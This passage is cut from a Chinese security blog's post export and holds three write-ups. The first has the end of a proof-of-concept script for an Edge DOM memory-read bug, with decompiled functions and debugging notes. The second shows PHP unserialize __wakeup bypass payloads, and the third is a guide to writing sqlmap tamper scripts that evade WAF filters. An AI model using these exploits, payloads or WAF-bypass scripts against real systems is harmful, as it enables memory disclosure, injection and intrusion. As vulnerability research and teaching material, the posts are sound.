最后oExistingChild成为了最后一个元素 // 但是这里出现了一个bug // oTextNode的nextSibling指向了自己 // 在这里，DOM树出现了一种类似循环的结构 for (var oNode = document.body.firstChild; oNode &amp;&amp; oNode != oNode.nextSibling; oNode = oNode.nextSibling) &#123; // 加上这段代码是为了防止被Edge检测到树的结构出现了问题 // 如果没有这段代码Js执行到这里的时候就会崩溃 &#125; if (oTextNode.nextSibling !== oTextNode) &#123; // 未触发漏洞时报错 throw new Error(\"Tree is not corrupt\"); &#125; alert(\"Set breakpoints if needed\"); // 这里是为了生成一个copy var sData = (\"A\" + oTextNode.nodeValue).substr(1); // 下面的逻辑是读取oTextNode.nodeValue的值 // 但实际上是内存中某块的位置 // 在读取之后按规则格式化输出 var sHexData = \"Read 0x\" + sData.length.toString(16); sHexData += \" bytes: ????????`????????\"; sHexQWord = \"`????????\"; for (var uBytes = 4, uOffset = 4, uIndex = 0; uIndex &lt; sData.length; uIndex++) &#123; var sHexWord = sData.charCodeAt(uIndex).toString(16); while (sHexWord.length &lt; 4) sHexWord = \"0\" + sHexWord; sHexQWord = sHexWord + sHexQWord; uBytes += 2; if (uBytes == 4) sHexQWord = \"`\" + sHexQWord; if (uBytes == 8) &#123; sHexData += \" \" + sHexQWord; sHexQWord = \"\"; uBytes = 0; &#125;; &#125;; if (sHexQWord) &#123; while (sHexQWord.length &lt; 17) &#123; if (sHexQWord.length == 8) sHexQWord += \"`\"; sHexQWord = \"????\" + sHexQWord; &#125; sHexData += \" \" + sHexQWord; &#125; alert(sHexData); // 代码执行到这里的时候会crash // 但是这里已经可以读取栈上的数据了 oTextNode.nodeValue = \"\"; &#125;; &lt;/script&gt; &lt;/head&gt; &lt;body&gt;x&lt;x id=oExistingChild&gt;&lt;/x&gt;&lt;/body&gt;&lt;/html&gt; 2.3 Code Analyze上面这个利用流程，比较关键的几个函数是CDOMTextNode::get_data、CDOMTextNode::get_length 读取数据的函数是CDOMTextNode::get_data，代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960__int64 __fastcall CDOMTextNode::get_data(CDOMTextNode *this, unsigned __int16 **a2)&#123; unsigned __int16 **v2; // rbx@1 CDOMTextNode *this_rdi; // rdi@1 Tree::TextData *v4; // rcx@2 __int32 v5; // eax@4 BSTR v6; // rax@4 int v7; // ebp@4 struct CTreePos *v8; // rax@4 struct CTreePos *v9; // rsi@4 Tree::TextNode *v10; // rdi@4 unsigned __int16 *v11; // rax@5 Tree::ANode *v12; // rax@5 CTreePos *v13; // rcx@6 __int64 v14; // r9@9 const OLECHAR *v15; // rax@9 UINT v16; // er9@9 BSTR v17; // rax@9 UINT ui; // [sp+48h] [bp+10h]@4 unsigned __int32 v20; // [sp+50h] [bp+18h]@5 v2 = a2; this_rdi = this; if ( a2 ) &#123; *a2 = 0i64; v4 = (Tree::TextData *)*((_QWORD *)this + 6); if ( v4 ) &#123; v14 = *(_DWORD *)v4; v15 = Tree::TextData::GetText(v4, 0, 0i64); v17 = SysAllocStringLen(v15, v16); *v2 = (unsigned __int16 *)Abandonment::CheckAllocationUntyped(v17); &#125; else if ( CDOMTextNode::IsPositioned(this_rdi) ) &#123; ui = 0; v5 = CDOMTextNode::get_length(this_rdi, (__int32 *)&amp;ui); Abandonment::CheckHRESULTStrict(v5); v6 = SysAllocStringLen(0i64, ui); *v2 = (unsigned __int16 *)Abandonment::CheckAllocationUntyped(v6); v7 = 0; LODWORD(v8) = Tree::TextNode::TextNodeFromDOMTextNode((__int64)this_rdi); v9 = v8; v10 = v8; do &#123; v11 = Tree::TextNode::Text(v10, 0, &amp;v20); memcpy_s(&amp;(*v2)[v7], 2i64 * (signed int)(ui - v7), v11, 2i64 * v20); v7 += v20; v12 = Tree::TreeReader::GetNextSiblingWithFilter( v10, (enum Tree::NodeFilterResultsEnum (__stdcall __high static *)(const struct Tree::ANode *))&amp;Dom::TreeReader::ScriptableIdentityFilter); v10 = v12; &#125; while ( v12 &amp;&amp; Tree::ANode::IsTextNode(v12) &amp;&amp; CTreePos::IsSameTextOrCDataNode(v13, v9) ); &#125; &#125; return 0i64;&#125; 在函数中有一次调用(__int32 *)&ui)```1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950代码如下，其中a2的值是ui，也就是0，而CDOMTextNode::IsPositioned(this)返回值为真，即进入了第二个逻辑，在该逻辑中进行了长度的处理获取长度后，则在get\\_data函数中，在```memcpy_s(&amp;(*v2)[v7], 2i64 * (signed int)(ui - v7), v11, 2i64 * v20)```这行代码利用memcpy_s不断读取内存中的值至长度到达之前get\\_length函数返回的值位置。这里读取的是v11指向中保存地址指向的值，那我们再上溯，```v11 = Tree::TextNode::Text(v10, 0, &amp;v20);```，其中v10的值是Tree::TextNode::TextNodeFromDOMTextNode返回的一个结构体指针，而调用该函数的参数是rcx。```cc__int64 __fastcall CDOMTextNode::get_length(CDOMTextNode *this, __int32 *a2)&#123; __int32 *v2; // rax@1 signed int v3; // ebx@1 __int32 *v4; // rsi@1 CDOMTextNode *v5; // rdi@1 struct CTreePos *v7; // rax@6 struct CTreePos *v8; // rbp@6 struct CTreePos *v9; // r11@6 __int32 v10; // edi@6 Tree::ANode *v11; // rax@7 CTreePos *v12; // rcx@8 v2 = (__int32 *)*((_QWORD *)this + 6); v3 = 0; v4 = a2; v5 = this; if ( v2 ) &#123; *a2 = *v2; &#125; else if ( CDOMTextNode::IsPositioned(this) ) &#123; LODWORD(v7) = Tree::TextNode::TextNodeFromDOMTextNode((__int64)v5); v8 = v7; v9 = v7; v10 = 0; do &#123; v10 += **((_DWORD **)v9 + 7); v11 = Tree::TreeReader::GetNextSiblingWithFilter( v9, (enum Tree::NodeFilterResultsEnum (__stdcall __high static *)(const struct Tree::ANode *))&amp;Dom::TreeReader::ScriptableIdentityFilter); &#125; while ( v11 &amp;&amp; Tree::ANode::IsTextNode(v11) &amp;&amp; CTreePos::IsSameTextOrCDataNode(v12, v8) ); *v4 = v10; &#125; else &#123; v3 = -2147024809; &#125; return (unsigned int)v3;&#125; 2.4 Dynamic Analysis对get_data下断点后开始单步跟踪，发现这里get_length函数的返回值和节点oExistingChild的长度相关，也就是说，这里出现了一个bug，在本来应该读取textnode的长度的时候，返回了一个和oExistingChild长度相关的数值，即我们可以一定程度上控制读取的数据长度，当然，这里数据如果太长，在读取的时候会触发一个访问错误，导致进程崩溃无法继续读取。 最后结合动态调试和代码分析发现length是从结构体指针处偏移0x1c的位置指向的指针指向的位置中取出来，即first_struct-&gt;other_struct-&gt;length。而读取的地址位置则是结构体指针偏移0xC的位置。 3. References1. zerodayinitiative 2. microsoft 3. securitytracker 4. cve.mitre.org 5. vuldb 6. skylined blog","categories":[{"name":"Misc","slug":"Misc","permalink":"https://LyleMi.github.io/categories/Misc/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://LyleMi.github.io/tags/CVE/"}]},{"title":"php unserialize()/wakeup()漏洞","slug":"2016-10-29-php-unserialize","date":"2016-10-29T01:31:40.000Z","updated":"2020-04-14T12:05:17.026Z","comments":true,"path":"2016/10/29/2016-10-29-php-unserialize/","link":"","permalink":"https://LyleMi.github.io/2016/10/29/2016-10-29-php-unserialize/","excerpt":"unserialize和serialize这里不做赘述。 unserialize的漏洞在magic function上，如果一个类定义了__wakup()和__destruct()，则该类的实例被反序列化时，会自动调用__wakeup(), 生命周期结束时，则调用__desturct()。","text":"unserialize和serialize这里不做赘述。 unserialize的漏洞在magic function上，如果一个类定义了__wakup()和__destruct()，则该类的实例被反序列化时，会自动调用__wakeup(), 生命周期结束时，则调用__desturct()。 下面提供一个简单的demo. 123456789101112131415161718192021222324class Demo&#123; public $data; public function __construct($data) &#123; $this-&gt;data = $data; echo \"construct&lt;br /&gt;\"; &#125; public function __wakeup() &#123; echo \"wake up&lt;br /&gt;\"; &#125; public function __destruct() &#123; echo \"Data's value is $this-&gt;data. &lt;br /&gt;\"; echo \"destruct&lt;br /&gt;\"; &#125;&#125;var_dump(serialize(new Demo(\"raw value\"))); 输出 1234constructData&apos;s value is raw value.destructstring(44) &quot;O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;data&quot;;s:9:&quot;raw value&quot;;&#125;&quot; 把序列化的字符串修改一下后，执行 1unserialize('O:4:\"Demo\":1:&#123;s:4:\"data\";s:15:\"malicious value\";&#125;'); 输出 123wake upData&apos;s value is malicious value.destruct 这里看到，值被修改了. 上面是一个unserialize()的简单应用，不难看出，如果__wakeup()或者 __desturct()有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。 那么，在__wakeup()中加入判断是否可以阻止这个漏洞呢？在__wakeup()中我们加入一行代码 12345public function __wakeup()&#123; if($this-&gt;data != 'raw value') $this-&gt;data = 'raw value'; echo \"wake up&lt;br /&gt;\";&#125; 但其实还是可以绕过的，在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本都存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过，于是使用下面的payload 1unserialize('O:7:\"HITCON\":1:&#123;s:4:\"data\";s:15:\"malicious value\";&#125;'); 输出 12Data&apos;s value is malicious value.destruct 这里wakeup被绕过，值依旧被修改了。","categories":[{"name":"Web","slug":"Web","permalink":"https://LyleMi.github.io/categories/Web/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://LyleMi.github.io/tags/反序列化/"},{"name":"PHP","slug":"PHP","permalink":"https://LyleMi.github.io/tags/PHP/"}]},{"title":"sqlmap-tamper编写指南","slug":"2016-6-6-sqlmap-tamper","date":"2016-06-06T01:31:40.000Z","updated":"2020-04-14T12:05:26.750Z","comments":true,"path":"2016/06/06/2016-6-6-sqlmap-tamper/","link":"","permalink":"https://LyleMi.github.io/2016/06/06/2016-6-6-sqlmap-tamper/","excerpt":"注：最近遇到了一些奇奇怪怪的waf，想自己写一些tamper但是发现没有参考材料可以使用，因此写了这篇文章，以方便进行自定义的tamper编写。笔者笔力有限，如有错误，敬请读者们指正。 0x00 sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。","text":"注：最近遇到了一些奇奇怪怪的waf，想自己写一些tamper但是发现没有参考材料可以使用，因此写了这篇文章，以方便进行自定义的tamper编写。笔者笔力有限，如有错误，敬请读者们指正。 0x00 sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 0x01 一个最小的例子为了说明tamper的结构，让我们从一个最简单的例子开始 1234567891011# sqlmap/tamper/escapequotes.pyfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWESTdef dependencies(): passdef tamper(payload, **kwargs): return payload.replace(\"'\", \"\\\\'\").replace('\"', '\\\\\"') 不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。 priority定义脚本的优先级，用于有多个tamper脚本的情况。 dependencies函数声明该脚本适用/不适用的范围，可以为空。 tamper是主要的函数，接受的参数为payload和**kwargs返回值为替换后的payload。比如这个例子中就把引号替换为了\\\\\\\\&#39;。 0x02 详细介绍第一部分完成了一个最简单的tamper架构，下面我们进行更详细的介绍 tamper函数tamper是整个脚本的主体。主要用于修改原本的payload。举例来说，如果服务器上有这么几行代码 12$id = trim($POST($id),'union');$sql=\"SELECT * FROM users WHERE id='$id'\"; 而我们的payload为1-8363&apos; union select null -- - 这里因为union被过滤掉了，将导致payload不能正常执行，那么就可以编写这样的tamper 12def tamper(payload, **kwargs): return payload.replace('union','uniounionn') 保存为replaceunion.py，存到sqlmap/tamper/下，执行的时候带上–tamper=replaceunion的参数，就可以绕过该过滤规则 dependencies函数dependencies函数，就tamper脚本支持/不支持使用的环境进行声明，一个简单的例子如下： 12345678# sqlmap/tamper/echarunicodeencode.pyfrom lib.core.common import singleTimeWarnMessagedef dependencies(): singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against ASP or ASP.NET web applications\" % os.path.basename(__file__).split(\".\")[0])# singleTimeWarnMessage() 用于在控制台中打印出警告信息 kwargs在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header，这里以其中一个为例进行简单说明 123456# sqlmap/tamper/vanrish.pydef tamper(payload, **kwargs): headers = kwargs.get(\"headers\", &#123;&#125;) headers[\"X-originating-IP\"] = \"127.0.0.1\" return payload 这个脚本是为了更改X-originating-IP，以绕过WAF，另一个kwargs的使用出现于xforwardedfor.py，也是为了改header以绕过waf 0x3 结语tamper的编写远不止这些，本文只就其最基本的结构进行探讨。作为sqlmap的扩展，在编写tamper时几乎所有的sqlmap内置的函数、变量都可以使用，本文不一一列出。 0x04 附录：部分常数值123456789101112131415161718192021222324# sqlmap/lib/enums.pyclass PRIORITY: LOWEST = -100 LOWER = -50 LOW = -10 NORMAL = 0 HIGH = 10 HIGHER = 50 HIGHEST = 100class DBMS: ACCESS = \"Microsoft Access\" DB2 = \"IBM DB2\" FIREBIRD = \"Firebird\" MAXDB = \"SAP MaxDB\" MSSQL = \"Microsoft SQL Server\" MYSQL = \"MySQL\" ORACLE = \"Oracle\" PGSQL = \"PostgreSQL\" SQLITE = \"SQLite\" SYBASE = \"Sybase\" HSQLDB = \"HSQLDB\"","categories":[{"name":"Web","slug":"Web","permalink":"https://LyleMi.github.io/categories/Web/"}],"tags":[]}]}